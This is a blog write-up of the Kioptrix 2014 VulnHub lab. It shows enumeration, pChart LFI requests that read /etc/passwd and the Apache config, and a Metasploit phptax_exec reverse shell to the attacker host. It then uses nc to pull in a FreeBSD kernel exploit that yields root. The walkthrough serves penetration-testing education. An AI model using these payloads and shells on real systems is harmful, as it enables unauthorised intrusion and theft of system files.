<i>Kioptrix 2014 VM can be downloaded <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank">here</a>. </i><br /><h2>0. Get VMs IP</h2><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> netdiscover -r 192.168.1.0/24<br /><span style="color: black; font-style: italic;"><br /> Currently scanning: Finished!   |   Screen View: Unique Hosts                 <br />                                                                               <br /> 258 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 15480           <br /> _____________________________________________________________________________<br />   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br /> -----------------------------------------------------------------------------<br /> ...<br /> 192.168.1.68    c4:e9:84:10:d3:5e      2     120  TP-LINK TECHNOLOGIES CO.,LTD<br /> ...  <br /></span></pre></div><h2>1. Enumeration&nbsp;</h2><h4>TCP Ports enumeration</h4><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~#</span> nmap -p- -sV 192.168.1.68<br /><br /><span style="color: #888888;">Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-07 15:00 EST</span><br /><span style="color: #888888;">Service scan Timing: About 0.00% done</span><br /><span style="color: #888888;">Nmap scan report for 192.168.1.68</span><br /><span style="color: #888888;">Host is up (0.00016s latency).</span><br /><span style="color: #888888;">Not shown: 65532 filtered ports</span><br /><span style="color: #888888;">PORT     STATE  SERVICE VERSION</span><br /><span style="color: #888888;">22/tcp   closed ssh</span><br /><b><span style="color: #888888;">80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</span><br /><span style="color: #888888;">8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</span></b><br /><span style="color: #888888;">MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)</span><br /><br /><span style="color: #888888;">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br /><span style="color: #888888;">Nmap done: 1 IP address (1 host up) scanned in 112.67 seconds</span><br /></pre></div><br />We found some decent information:<br /><ul><li>Web server on port 80</li><li>Web server on port 8080 (Proxy?)</li><li>Victim's OS is FreeBSD</li></ul><h2>2. Web server port 80</h2><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><h3 style="line-height: 125%; margin: 0;"><span style="color: #888888;">It works!</span></h3></div><br />Uhh, well I'm glad it does. Checking the source code was worth it.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: green; font-weight: bold;">&lt;head&gt;</span><br />  <span style="color: #408080; font-style: italic;">&lt;!--</span><br /><span style="color: #408080; font-style: italic;">  &lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php"&gt;</span><br /><span style="color: #408080; font-style: italic;">  --&gt;</span><br /> <span style="color: green; font-weight: bold;">&lt;/head&gt;</span><br /><br /> <span style="color: green; font-weight: bold;">&lt;body&gt;</span><br />  <span style="color: green; font-weight: bold;">&lt;h1&gt;</span>It works!<span style="color: green; font-weight: bold;">&lt;/h1&gt;</span><br /> <span style="color: green; font-weight: bold;">&lt;/body&gt;</span><br /></pre></div><br />Hitting <b>/pChart2.1.3/index.php</b> shows some charting tool. After searching for the tool's name on searchsploit, it showed that it's vulnerable to LFI.<br /><br />Example:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</span><br /></pre></div><br />After poking around for a while I wasn't able to find anything useful, what's the next step? For that, let's see what we currently know.<br /><br />1. Victim runs FreeBSD, so many important files could be under different paths.<br />2. Port 8080 returns a 403, what's preventing us from accessing the page?<br /><br />Since we have an LFI and we know that the server is running Apache, let's search for the apache config file. After checking this, I managed to find the httpd.config file.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">http://192.168.1.68/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</span><br /></pre></div><br />Particularly interesting snippet:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: green;">SetEnvIf</span> <span style="color: green; font-weight: bold;">User</span>-Agent ^Mozilla/4.0 Mozilla4_browser<br /><br /><span style="color: green; font-weight: bold;">&lt;VirtualHost</span> <span style="color: #ba2121;">*:8080</span><span style="color: green; font-weight: bold;">&gt;</span><br />    <span style="color: green;">DocumentRoot</span> <span style="color: green;">/usr/local/www/apache22/data2</span><br /><br /> <span style="color: green; font-weight: bold;">&lt;Directory</span> <span style="color: #ba2121;">"/usr/local/www/apache22/data2"</span><span style="color: green; font-weight: bold;">&gt;</span><br />  <span style="color: green;">Options</span> Indexes FollowSymLinks<br />  <span style="color: green;">AllowOverride</span> <span style="color: green; font-weight: bold;">All</span><br />  <span style="color: green;">Order</span> allow,deny<br />  <span style="color: green;">Allow</span> from env=Mozilla4_browser<br /> <span style="color: green; font-weight: bold;">&lt;/Directory&gt;</span><br /><br /><span style="color: green; font-weight: bold;">&lt;/VirtualHost&gt;</span><br /></pre></div><br />We'll need to access the server running on 8080 with a different user-agent.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> curl -H <span style="color: #ba2121;">"User-Agent:Mozilla/4.0"</span> http://192.168.1.68:8080</pre><pre style="line-height: 125%; margin: 0;"><span style="color: #bc7a00;">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span><br /><span style="color: green; font-weight: bold;">&lt;html&gt;</span><br /> <span style="color: green; font-weight: bold;">&lt;head&gt;</span><br />  <span style="color: green; font-weight: bold;">&lt;title&gt;</span>Index of /<span style="color: green; font-weight: bold;">&lt;/title&gt;</span><br /> <span style="color: green; font-weight: bold;">&lt;/head&gt;</span><br /> <span style="color: green; font-weight: bold;">&lt;body&gt;</span><br /><span style="color: green; font-weight: bold;">&lt;h1&gt;</span>Index of /<span style="color: green; font-weight: bold;">&lt;/h1&gt;</span><br /><span style="color: green; font-weight: bold;">&lt;ul&gt;&lt;li&gt;&lt;a</span> <span style="color: #7d9029;">href=</span><span style="color: #ba2121;">"phptax/"</span><span style="color: green; font-weight: bold;">&gt;</span> phptax/<span style="color: green; font-weight: bold;">&lt;/a&gt;&lt;/li&gt;</span><br /><span style="color: green; font-weight: bold;">&lt;/ul&gt;</span><br /><span style="color: green; font-weight: bold;">&lt;/body&gt;&lt;/html&gt;</span>&nbsp;</pre><pre style="line-height: 125%; margin: 0;"><span style="color: navy; font-weight: bold;">root@kali:~/Desktop#</span> curl -H <span style="color: #ba2121;">"User-Agent:Mozilla/4.0"</span> http://192.168.1.68:8080/phptax/</pre><pre style="line-height: 125%; margin: 0;">&nbsp;</pre><pre style="line-height: 125%; margin: 0;"><i>lots of markup</i> </pre></div><br />So what should we do next?<br /><h2>3. Getting a shell, and root</h2><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #666666;">msf &gt; <b>use exploit/multi/http/phptax_exec</b><br /><br />msf exploit(phptax_exec) &gt; <b>show options</b><br /><br />Module options (exploit/multi/http/phptax_exec):<br /><br />   Name       Current Setting  Required  Description<br />   ----       ---------------  --------  -----------<br />   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]<br />   RHOST                       yes       The target address<br />   RPORT      80               yes       The target port<br />   SSL        false            no        Negotiate SSL/TLS for outgoing connections<br />   TARGETURI  /phptax/         yes       The path to the web application<br />   VHOST                       no        HTTP server virtual host<br /><br /><br />Exploit target:<br /><br />   Id  Name<br />   --  ----<br />   0   PhpTax 0.8<br /><br /><br /><br />msf exploit(phptax_exec) &gt; <b>set RHOST 192.168.1.68</b><br />RHOST =&gt; 192.168.1.68<br /><br />msf exploit(phptax_exec) &gt; <b>set RPORT 8080</b><br />RPORT =&gt; 8080<br /><br />msf exploit(phptax_exec) &gt; <b>run</b><br /><br />[*] Started reverse TCP double handler on 192.168.1.67:4444 <br />[*] 192.168.1.688080 - Sending request...<br />[*] Accepted the first client connection...<br />[*] Accepted the second client connection...<br />[*] Accepted the first client connection...<br />[*] Accepted the second client connection...<br />[*] Command: echo V5HLbXsCcLqrTr6R;<br />[*] Writing to socket A<br />[*] Writing to socket B<br />[*] Reading from sockets...<br />[*] Command: echo dcW9zf08z50hnZcW;<br />[*] Writing to socket A<br />[*] Writing to socket B<br />[*] Reading from sockets...<br />[*] Reading from socket B<br />[*] B: "V5HLbXsCcLqrTr6R\r\n"<br />[*] Matching...<br />[*] A is input...<br />[*] Reading from socket B<br />[*] B: "dcW9zf08z50hnZcW\r\n"<br />[*] Matching...<br />[*] A is input...<br />[*] Command shell session 1 opened (192.168.1.67:4444 -&gt; 192.168.1.68:20092) at 2017-01-07 16:39:33 -0500<br />[*] Command shell session 2 opened (192.168.1.67:4444 -&gt; 192.168.1.68:40864) at 2017-01-07 16:39:33 -0500<br /><br />whoami<br />www</span><br /></pre></div><br />I won't go through all my attempts since they were many, I'm listing the important ones findings though:<br /><ul><li>It's running FreeBSD 9.0 </li><li>No users in /home</li><li>System doesn't have python, bash, wget and many other stuff, it does have perl and gcc though</li></ul>Easily enough, searching for an exploit for FreeBSD 9.0 was <a href="https://www.exploit-db.com/exploits/28718/">straight-forward</a>. I transferred the exploit file through nc, compiled it and got root.<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #444444;">which gcc<br />/usr/bin/gcc<br /><span style="color: green;">cd</span> /tmp<br />wget https://www.exploit-db.com/download/28718<br />wget: not found<br />which nc<br />/usr/bin/nc<br />nc -nv 192.168.1.67 443 -w 5 &gt; exploit.c<br />Connection to 192.168.1.67 443 port <span style="color: #666666;">[</span>tcp/*<span style="color: #666666;">]</span> succeeded!<br /><br />gcc exploit.c<br /><br />./a.out<br /><span style="color: #666666;">[</span>+<span style="color: #666666;">]</span> SYSRET FUCKUP!!<br /><span style="color: #666666;">[</span>+<span style="color: #666666;">]</span> Start Engine...<br /><span style="color: #666666;">[</span>+<span style="color: #666666;">]</span> Crotz...<br /><span style="color: #666666;">[</span>+<span style="color: #666666;">]</span> Crotz...<br /><span style="color: #666666;">[</span>+<span style="color: #666666;">]</span> Crotz...<br /><span style="color: #666666;">[</span>+<span style="color: #666666;">]</span> Woohoo!!!<br />whoami<br />root</span><br /></pre></div><br />Where's our flag?<i> </i><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #444444;">cd /root<br />ls -al<br />total 88<br />drwxr-xr-x   2 root  wheel   512 Jan  7 00:57 .<br />drwxr-xr-x  18 root  wheel  1024 Jan  7 01:42 ..<br />-rw-r--r--   2 root  wheel   793 Jan  3  2012 .cshrc<br />-rw-------   1 root  wheel     0 Apr  6  2014 .history<br />-rw-r--r--   1 root  wheel   151 Jan  3  2012 .k5login<br />-rw-r--r--   1 root  wheel   299 Jan  3  2012 .login<br />-rw-------   1 root  wheel     1 Mar 30  2014 .mysql_history<br />-rw-r--r--   2 root  wheel   256 Jan  3  2012 .profile<br />----------   1 root  wheel  2611 Apr  3  2014 congrats.txt<br />-rw-r--r--   1 root  wheel   885 Jan  7 16:49 folderMonitor.log<br />lrwxr-xr-x   1 root  wheel    25 Mar 29  2014 httpd-access.log -&gt; /var/log/httpd-access.log<br />-rwxr-xr-x   1 root  wheel   574 Apr  3  2014 lazyClearLog.sh<br />-rwx------   1 root  wheel  2366 Mar 28  2014 monitor.py<br />lrwxr-xr-x   1 root  wheel    44 Mar 29  2014 ossec-alerts.log -&gt; /usr/local/ossec-hids/logs/alerts/alerts.log<br />chmod 777 congrats.txt<br />cat congrats.txt <br />If you are reading this, it means you got root (or cheated).<br />Congratulations either way...<br /><br />Hope you enjoyed this new VM of mine. As always, they are made for the beginner in <br />mind, and not meant for the seasoned pentester. However this does not mean one <br />can't enjoy them.<br /><br />As with all my VMs, besides getting "root" on the system, the goal is to also<br />learn the basics skills needed to compromise a system. Most importantly, in my mind,<br />are information gathering &amp; research. Anyone can throw massive amounts of exploits<br />and "hope" it works, but think about the traffic.. the logs... Best to take it<br />slow, and read up on the information you gathered and hopefully craft better<br />more targetted attacks. <br /><br />For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.<br />Knowing the OS gives you any idea of what will work and what won't from the get go.<br />Default file locations are not the same on FreeBSD versus a Linux based distribution.<br />Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".<br />It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".<br />Finding and knowing these little details will greatly help during an attack. Of course<br />my examples are specific for this target, but the theory applies to all systems.<br /><br />As a small exercise, look at the logs and see how much noise you generated. Of course<br />the log results may not be accurate if you created a snapshot and reverted, but at least<br />it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.<br />Default settings, nothing fancy but it should've logged a few of your attacks. Look<br />at the following files:<br />/root/folderMonitor.log<br />/root/httpd-access.log (softlink)<br />/root/ossec-alerts.log (softlink)<br /><br />The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified<br />files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS <br />for this.<br />The httpd-access.log is rather self-explanatory .<br />Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain<br />files. This one should've detected a few of your web attacks.<br /><br />Feel free to explore the system and other log files to see how noisy, or silent, you were.<br />And again, thank you for taking the time to download and play.<br />Sincerely hope you enjoyed yourself.<br /><br />Be good...<br /><br /><br />loneferret<br />http://www.kioptrix.com<br /><br /><br />p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by<br />default it would've blocked your IP (both in hosts.allow &amp; Firewall) for<br />600 seconds. I was nice enough to remove that part :)</span><br /></pre></div><i></i> <br /><h4><i>Final notes</i></h4><span style="font-weight: normal;">VM is quite entertaining, yet I had a lot of trouble knowing what I should be looking for after I got the LFI vulnerability. I had limited knowledge about FreeBSD so I thought the apache file didn't exist first time I attempted it.&nbsp;</span><br /><br />Make sure you read the flag file carefully, I won't discuss it since it's pretty much self-explanatory.